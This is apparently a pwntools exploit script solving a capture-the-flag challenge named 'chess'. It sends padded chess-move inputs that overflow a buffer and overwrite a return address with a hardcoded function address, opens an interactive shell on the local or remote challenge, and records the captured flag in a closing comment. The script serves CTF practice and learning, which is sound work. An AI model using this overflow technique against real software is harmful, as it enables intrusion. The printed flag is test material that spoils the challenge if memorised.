#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './chess'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("challenges.ctfd.io", 30458)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b * 0x00401cc4
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

io.sendline(b"1") # play
io.recvuntil(b">> Enter your name:")
io.sendline(b"\x00"*14)

prompt = b"best move :"
io.recvuntil(prompt)
io.sendline(b"Ra1 " + b"a"*(0x79-8))

io.recvuntil(prompt)
io.sendline(b"Qg7 " + b"b"*(0x79))

io.recvuntil(prompt)
io.sendline(b"Kd2 " + b"i"*(0x79-31) + p64(0x004011e6)) # p64(0x004011c2))

io.interactive()

# flag{And_y0u_didnt_ev3n_n33d_th3_pills}
